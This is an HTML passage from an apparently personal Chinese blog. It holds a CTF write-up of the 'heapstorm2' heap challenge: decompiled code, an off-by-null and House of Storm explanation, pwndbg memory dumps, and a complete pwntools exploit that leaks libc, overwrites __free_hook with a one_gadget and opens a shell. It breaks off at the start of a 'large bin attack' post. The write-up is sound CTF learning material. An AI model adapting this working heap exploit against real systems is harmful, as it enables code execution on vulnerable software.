Allocated\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Size&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">update</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v2 = sub_1551();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">15</span> || !sub_BCC(a1, a1[<span class="number">2</span> * v2 + <span class="number">5</span>]) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  v3 = sub_1551();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> || v3 &gt; (<span class="keyword">unsigned</span> __int64)(sub_BCC(a1, a1[<span class="number">2</span> * v2 + <span class="number">5</span>]) - <span class="number">12</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid Size&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  v4 = sub_BB0(a1, a1[<span class="number">2</span> * v2 + <span class="number">4</span>]);</span><br><span class="line">  sub_1377(v4, v3);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(v3 + v4), <span class="string">&quot;HEAPSTORM_II&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Chunk %d Updated\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">free</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v3 = sub_1551();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">15</span> || !sub_BCC(a1, *(_QWORD *)(<span class="number">16</span> * (v3 + <span class="number">2LL</span>) + a1 + <span class="number">8</span>)) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index&quot;</span>);</span><br><span class="line">  v2 = (<span class="keyword">void</span> *)sub_BB0(a1, *(_QWORD *)(<span class="number">16</span> * (v3 + <span class="number">2LL</span>) + a1));</span><br><span class="line">  <span class="built_in">free</span>(v2);</span><br><span class="line">  *(_QWORD *)(<span class="number">16</span> * (v3 + <span class="number">2LL</span>) + a1) = sub_BB0(a1, <span class="number">0LL</span>);</span><br><span class="line">  *(_QWORD *)(<span class="number">16</span> * (v3 + <span class="number">2LL</span>) + a1 + <span class="number">8</span>) = sub_BCC(a1, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Chunk %d Deleted\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">show</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1[<span class="number">3</span>] ^ a1[<span class="number">2</span>]) != <span class="number">322401073LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Permission denied&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v4 = sub_1551();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> || v4 &gt; <span class="number">15</span> || !sub_BCC(a1, a1[<span class="number">2</span> * v4 + <span class="number">5</span>]) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Chunk[%d]: &quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4);</span><br><span class="line">  v2 = sub_BCC(a1, a1[<span class="number">2</span> * v4 + <span class="number">5</span>]);</span><br><span class="line">  v3 = sub_BB0(a1, a1[<span class="number">2</span> * v4 + <span class="number">4</span>]);</span><br><span class="line">  sub_14D4(v3, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_180A);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是几个重要的功能，add是申请一个堆，然后把堆地址和size异或后在储存在程序自己申请的一个内存空间里（第一次见地址异或），update是向指定堆里写入，不过有size限制，只能输入size-12个字符，然后程序还会在补充12个字符，然后再补充一个\x00，这就构成offbynull了，free也没ufa.</p>
<p>看一下保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开</p>
<p>回归分析程序本身，刚分析时发现有offbynull,可以利用这一点完成ufa.</p>
<p>先申请几个堆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<p>看一看内存情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55c8c5183000</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55c8c5183020</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55c8c5183530</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br></pre></td></tr></table></figure>

<p>大致思路，把chunk1分成两个chunk（姑且称为chunk3和chunk4），然后利用chunk2合并chunk3</p>
<p>先简单说一下unlink时的步骤，首先会判断这个chunk的prev_inuse是否为0，如果为0，就代表上个chunk是空闲的，然后再通过prev_size来索引到上个chunk合并，合并完后最后的size就是这个chunk的size加上prev_size的值。</p>
<p>一般chunk的prev_size就是上一个物理相邻的chunk的大小，prev_size一般在上一个chunk被申请或者释放是改变，如果我们什么都不做，当chunk4被申请下来时，prev-size就是0，因为chunk4不是空闲的，而且prev_inuse是1，根本不会发生unlink,要使prev_size一直是0x510,那就要对chunk1进行布置，当申请chunk3和chunk4时不会索引到prev_size来改变他的值，这就涉及另一个索引方式了，当一个chunk在bins上被申请时，会根据其size值索引到下一个物理相邻的chunk的prev_size，然后根据申请情况改变这个prev_size的值。</p>
<p>总结 ：.要使prev_inuse为0，其次prev_size=0x510不改变</p>
<p>要完成这两步要在堆上布置两处地方，一个是chunk1的size位，让其被申请回来时不索引到chunk2,另一个是伪造chunk1的prev_size,通过chunk1的size索引到这个地方，改变伪造的prev_size（或许还有验证）</p>
<p>先让chunk2的prev_inuse为0，只要把chunk1给free掉就好了。然后要改变chunk1的size让其索引到伪造的prev_size，我们可以把chunk1的size由0x510改成0x500,只要伪造prev_size到对应位置就好了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment"># 7 overlap</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>这样就完成了overlap，可以看一下内存情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x561071a20020</span></span><br><span class="line"><span class="number">0x561071a20020</span>:	<span class="number">0x49495f4d524f5453</span>	<span class="number">0x0000000000000531</span>-&gt;<span class="number">1</span></span><br><span class="line"><span class="number">0x561071a20030</span>:	<span class="number">0x00007fe7da00ab78</span>	<span class="number">0x00007fe7da00ab78</span></span><br><span class="line"><span class="number">0x561071a20040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>-&gt;<span class="number">7</span></span><br><span class="line"><span class="number">0x561071a20050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a20060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a20070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a20080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a20090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a200a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a200b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见chunk1和chunk2合并了,然后合并的chunk包含chunk7（此时有一个指针指向他）,然后再把chunk申请出来，就有两个指针指向chunk7了，构成了ufa,</p>
<p>chunk7是 large所以可以用houseofstorm来打0x13370800.此时只需要再来一个可以控制的chunk就好了，如法炮制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#4</span></span><br><span class="line">update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#7 overlap</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># add(0x18)</span></span><br><span class="line"><span class="comment"># add(0x4d8)</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">update(<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#8</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure>

<p>这样就能控制两个chunkl的fd,bk,fd_nextsize,bk_size了，让这两个一个在large一个在unsorted，其中一个chunk是chunk2，大小为0x4f0,一个现在还待在unsortefd,大小为0x4e0,构成houseofstorm得要一个较小的在largebin上，一个较大的在unsorted上，通过两次free(2)完成这一步</p>
<p>到这里就已经完成了houseofstorm的前置条件了，下面就通过houseofstorm来完成任意地址申请就好了。</p>
<p>houseofstorm前面捋过了，就不展开赘述了</p>
<p>下面是完整代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapstorm2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">ogg=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)   </span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>) </span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">while</span>  <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#sh=process(&#x27;./heapstorm2&#x27;)</span></span><br><span class="line">        <span class="comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;,29023)</span></span><br><span class="line">        <span class="comment">#gdb.attach(sh,&quot;b main&quot;)</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">        add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">        update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">        add(<span class="number">0x508</span>)<span class="comment">#4</span></span><br><span class="line">        update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        update(<span class="number">0</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)<span class="comment">#7 overlap</span></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># add(0x18)</span></span><br><span class="line">        <span class="comment"># add(0x4d8)</span></span><br><span class="line">        add(<span class="number">0x38</span>)<span class="comment">#1</span></span><br><span class="line">        add(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">        update(<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        update(<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)<span class="comment">#8</span></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        free(<span class="number">5</span>)</span><br><span class="line">        add(<span class="number">0x48</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#unsorted bin</span></span><br><span class="line">        fake_chunk=<span class="number">0x13370800</span>-<span class="number">0x20</span></span><br><span class="line">        p1=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>)</span><br><span class="line">        p1+=p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">        update(<span class="number">7</span>,p1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#large bin</span></span><br><span class="line">        p=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4e1</span>)</span><br><span class="line">        p+=p64(<span class="number">0</span>)+p64(fake_chunk+<span class="number">8</span>)</span><br><span class="line">        p+=p64(<span class="number">0</span>)+p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">        update(<span class="number">8</span>,p)</span><br><span class="line">        add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">        p2=p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)</span><br><span class="line">        p2+=p64(<span class="number">0x13370800</span>)</span><br><span class="line">        update(<span class="number">2</span>,p2)</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(fake_chunk+<span class="number">3</span>)+p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;]: &#x27;</span>)</span><br><span class="line">        heap=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(heap+<span class="number">0x10</span>)+p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;]: &#x27;</span>)</span><br><span class="line">        hook_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line">        libc_base=hook_base-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">        free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(free_hook)+p64(<span class="number">0x8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        update(<span class="number">1</span>,p64(ogg[<span class="number">1</span>]+libc_base))</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./heapstorm2&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/25/large-bin-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/25/large-bin-attack/" class="post-title-link" itemprop="url">large bin attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-25 21:30:31 / 修改时间：21:31:02" itemprop="dateCreated datePublished" datetime="2021-11-25T21:30:31+08:00">2021-11-25</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large    Bin    Attack"></a>Large    Bin    Attack</h1><p>好耶，又是另一个链表的利用🤢🤢。</p>
<p>没太看懂，再去看看</p>
<p>有点看懂了，回来记录一下</p>
